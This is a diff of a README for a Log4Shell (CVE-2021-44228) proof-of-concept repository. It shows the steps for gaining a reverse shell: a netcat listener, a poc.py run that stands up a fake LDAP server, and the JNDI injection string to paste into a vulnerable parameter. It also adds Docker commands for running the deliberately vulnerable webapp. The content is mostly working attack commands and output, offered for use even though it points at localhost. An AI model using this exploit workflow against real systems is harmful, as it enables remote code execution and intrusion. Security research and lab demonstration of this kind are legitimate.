@@ -28,15 +28,8 @@ https://user-images.githubusercontent.com/87979263/145728478-b4686da9-17d0-4511-
 Proof-of-concept (POC)
 ----------------------
 
+As a PoC we have created a python file that automates the process. 
 
-
-As a POC we have created a python file that automates the process.
-
-* Start an http server.<br>
-**Note:** This must be run in the same directory as the rest of the repository.
-```py
-sudo python3 -m http.server 80
-```
 * Start a netcat listener to accept reverse shell connection.<br>
 ```py
 nc -lvnp 9001
@@ -44,19 +37,20 @@ nc -lvnp 9001
 * Launch the exploit.<br>
 **Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
 ```py
-python3 poc.py
-java version "1.8.0_20"
-Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
-Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
+$ python3 poc.py --userip localhost --webport 8000 --lport 9001
 
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
 
-[+] Enter IP for LDAPRefServer & Shell: localhost
-[+] Enter listener port for LDAPRefServer: 80
-[+] Set listener port for shell: 9001
+[+] Exploit java class created success
+[+] Setting up fake LDAP server
+
 [+] Send me: ${jndi:ldap://localhost:1389/a}
 
 Listening on 0.0.0.0:1389
 ```
+
+This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.
 
 <br>
 
@@ -64,7 +58,12 @@ Listening on 0.0.0.0:1389
 Our vulnerable application
 --------------------------
 
-Running the application currently is easiest done in the paid version of Intellij, but we plan on adding a Dockerfile in the future.
+We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
+```c
+1: docker build -t log4j-shell-poc .
+2: docker run --network host log4j-shell-poc
+```
+Once it is running, you can access it on localhost:8080
 
 If you would like to further develop the project you can use Intellij IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.
 
